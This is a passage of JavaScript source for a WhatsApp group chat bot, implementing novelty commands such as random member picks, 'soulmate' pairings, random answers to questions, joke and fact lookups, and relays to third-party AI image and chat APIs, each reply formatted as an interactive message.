          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
			case 'pick': {
            	if (!m.isGroup) return VeranStickGroup()
            	if (!text) return replygcveran(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await VeranBotInc.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let veranshimts = member[Math.floor(Math.random() * member.length)]
             let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `The most *${text}* here is *@${veranshimts.split("@")[0]}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [veranshimts], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
             
         }
     break
				
     case 'yomamajoke': {
      try {
          // Fetch a yo mama joke from the API
          let res = await fetch(`https://yomamaindra.onrender.com/jokes`);
  
          if (!res.ok) {
              throw new Error(`API request failed with status ${res.status}`);
          }
  
          let json = await res.json();
  
          // Extract the joke from the response
          let yoMamaJoke = `${json.joke}`;
  
          // Create the message with design
          let msgs = generateWAMessageFromContent(m.chat, {
              viewOnceMessage: {
                  message: {
                      "messageContextInfo": {
                          "deviceListMetadata": {},
                          "deviceListMetadataVersion": 2
                      },
                      interactiveMessage: proto.Message.InteractiveMessage.create({
                          body: proto.Message.InteractiveMessage.Body.create({
                              text: yoMamaJoke
                          }),
                          footer: proto.Message.InteractiveMessage.Footer.create({
                              text: botname
                          }),
                          header: proto.Message.InteractiveMessage.Header.create({
                              hasMediaAttachment: false,
                              ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                          }),
                          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                              buttons: [{
                                  "name": "quick_reply",
                                  "buttonParamsJson": `{\"display_text\":\"😂 Another Joke\",\"id\":\"${prefix}yomamajoke\"}`
                              }],
                          }),
                          contextInfo: {
                              mentionedJid: [m.sender],
                              forwardingScore: 999,
                              isForwarded: true,
                              forwardedNewsletterMessageInfo: {
                                  newsletterJid: '100000000000000000@newsletter',
                                  newsletterName: ownername,
                                  serverMessageId: 143
                              }
                          }
                      })
                  }
              }
          }, { quoted: m });
  
          // Send the message
          return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
      } catch (error) {
          console.error('API Fetch Error:', error);
          return await VeranBotInc.sendText(m.chat, "An error occurred while fetching the joke. Please try again.");
      }
  }
  break;
			case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} *Fact:* ${data.fact}\n`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
    }
    break	
  
			case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const verankak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: verankak
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
break
            case 'soulmate': {
            if (!m.isGroup) return VeranStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `👫Your Soulmate Is

@${me.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/soulmate.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [me, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return VeranStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `💏Couple\n\n@${orang.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}\n\nCieeee, What's Going On❤️💖👀`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/couple.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [orang, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'can': {
            	if (!text) return replygcveran(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'is': {
            	if (!text) return replygcveran(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'when': {
            	if (!text) return replygcveran(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'what': {
            	if (!text) return replygcveran(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'where': {
if (!text) return replygcveran(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'how': {
            	if (!text) return replygcveran(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer😅`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'rate': {
            	if (!text) return replygcveran(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'define': 
if (!q) return replygcveran(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcveran(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: reply
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
} catch (err) {
    console.log(err)
    return replygcveran(`*${q}* isn't a valid text`)
    }
    break
    case 'blackboxai': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} write a program to delete file`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/blackbox-ai?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Blackbox AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'travel-assistant': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} how can i visit taj mahal`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/copilot2trip?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Travel Assistant AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg') }, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'dalle': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/dalle?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Dalle\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'guru-ai': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/degreeGuru?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Guru AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'emi-ai': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/emi?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Emi AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
